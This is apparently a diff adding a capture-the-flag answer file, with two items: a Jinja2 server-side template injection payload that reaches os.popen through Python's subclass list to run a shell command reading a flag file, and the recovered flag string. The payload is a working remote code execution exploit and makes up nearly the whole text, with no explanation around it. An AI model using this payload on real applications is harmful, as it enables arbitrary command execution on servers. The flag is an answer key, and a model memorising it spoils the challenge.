@@ -1,0 +1,5 @@
+1.
+{{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /th1s*').read() }}
+
+2.
+FLAG{ssti.__class__.__pwn__}
